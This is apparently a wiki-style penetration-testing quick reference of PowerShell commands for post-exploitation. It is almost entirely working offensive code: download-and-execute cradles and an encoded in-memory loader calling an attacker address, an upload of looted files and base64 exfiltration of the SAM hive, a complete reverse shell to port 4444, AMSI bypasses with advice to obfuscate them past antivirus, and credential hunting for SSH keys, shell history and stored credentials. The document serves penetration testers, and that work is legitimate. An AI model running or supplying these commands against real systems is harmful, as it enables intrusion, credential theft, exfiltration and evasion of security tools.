---
tags: [shell, reference, tool]
module: core
last_updated: 2026-05-11
source_count: 0
---

# PowerShell — Penetration Testing Quick Reference

Essential PowerShell commands for post-exploitation, enumeration, and lateral movement. PowerShell is heavily monitored — prefer LOLBins and CMD when EDR is present.

## Execution Policy Bypass

```powershell
# Run a script bypassing execution policy (does not change system setting)
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass

# In-memory: encode and run
$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.15/script.ps1')"
powershell -EncodedCommand ([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)))
```

## System Enumeration

```powershell
# OS and build
Get-ComputerInfo
[System.Environment]::OSVersion
(Get-WmiObject Win32_OperatingSystem).Caption

# Current user and privileges
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
whoami /priv

# Hotfixes (patch level for CVE lookup)
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20
Get-WmiObject Win32_QuickFixEngineering | Select-Object HotFixID, InstalledOn

# Environment
$env:USERNAME
$env:COMPUTERNAME
$env:USERPROFILE
[System.Environment]::GetEnvironmentVariables()
```

## User and Group Enumeration

```powershell
# Local users
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, LastLogon

# Local groups
Get-LocalGroup

# Members of local administrators
Get-LocalGroupMember -Group "Administrators"

# Domain users (AD module or net commands)
Get-ADUser -Filter * -Properties * | Select-Object Name, SamAccountName, Enabled
net user /domain

# Domain admins
Get-ADGroupMember "Domain Admins"
```

## Network Enumeration

```powershell
# Interfaces and IPs
Get-NetIPConfiguration
Get-NetIPAddress

# Routing table
Get-NetRoute

# ARP cache
Get-NetNeighbor

# Active TCP connections (with process IDs)
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess

# Firewall rules
Get-NetFirewallRule | Where-Object Enabled -eq True | Select-Object DisplayName, Direction, Action

# DNS cache
Get-DnsClientCache

# Shares
Get-SmbShare
```

## Process and Service Enumeration

```powershell
# Running processes
Get-Process
Get-Process | Select-Object Name, Id, Path, Company

# Services
Get-Service | Where-Object Status -eq Running
Get-WmiObject Win32_Service | Select-Object Name, PathName, StartMode, State

# Scheduled tasks
Get-ScheduledTask | Where-Object State -ne Disabled | Select-Object TaskName, TaskPath
Get-ScheduledTask | ForEach-Object { [PSCustomObject]@{
    Name = $_.TaskName
    Action = ($_.Actions | Select-Object -ExpandProperty Execute -ErrorAction SilentlyContinue)
}}
```

## File System and Credential Hunting

```powershell
# Search for files containing "password"
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *.txt,*.ini,*.config,*.xml |
    Select-String -Pattern "password" -ErrorAction SilentlyContinue

# PowerShell history (gold mine)
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# Saved credentials
cmdkey /list
Get-StoredCredential  # requires CredentialManager module

# SSH keys
Get-ChildItem -Path $env:USERPROFILE\.ssh\ -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Recurse -Filter "id_rsa" -ErrorAction SilentlyContinue

# Files modified recently
Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) }

# Check AppData credential stores
Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials" -Force
```

## File Transfer

```powershell
# Download a file (DownloadFile)
(New-Object Net.WebClient).DownloadFile("http://10.10.14.15:8080/file.exe", "C:\Temp\file.exe")

# Download and execute in memory (DownloadString → IEX)
IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.15:8080/script.ps1")

# Download via Invoke-WebRequest
Invoke-WebRequest -Uri "http://10.10.14.15:8080/file.exe" -OutFile "C:\Temp\file.exe"

# Upload a file
Invoke-WebRequest -Uri "http://10.10.14.15:8080/upload" -Method POST -InFile "C:\Temp\loot.txt"

# Base64 encode a file for copy-paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Windows\System32\config\SAM"))
```

## Reverse Shell

```powershell
# PowerShell reverse shell (one-liner)
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.15", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

## WinRM / Remote Execution

```powershell
# Enter a remote PS session (requires creds)
Enter-PSSession -ComputerName 10.129.14.128 -Credential (Get-Credential)

# Run a command remotely
Invoke-Command -ComputerName 10.129.14.128 -ScriptBlock { whoami } -Credential $cred

# Create a credential object (for scripting — avoid plaintext where possible)
$pass = ConvertTo-SecureString "Password123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("administrator", $pass)
```

## AMSI Bypass (for script execution when AV blocks)

```powershell
# Matt Graeber's one-liner (detected by most AV now — use obfuscated versions)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Patch via reflection (vary to avoid signature)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext','NonPublic,Static')
$c=$b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteByte($c,8,0)
```

## Active Directory Enumeration (no extra modules)

```powershell
# Query AD via ADSI (built-in, no AD module needed)
([adsisearcher]"objectClass=user").FindAll() | ForEach-Object { $_.Properties.samaccountname }
([adsisearcher]"objectClass=computer").FindAll() | ForEach-Object { $_.Properties.cn }

# Find all SPNs (for Kerberoasting)
([adsisearcher]"servicePrincipalName=*").FindAll() |
    ForEach-Object { "$($_.Properties.samaccountname) — $($_.Properties.serviceprincipalname)" }

# Domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

## Related pages

- [[shell_commands/bash]]
- [[shell_commands/cmd]]
- [[attack/rdp]]
- [[attack/smb]]
- [[enumeration/windows_remote_mgmt]]
- [[definitions/auth_protocols]]
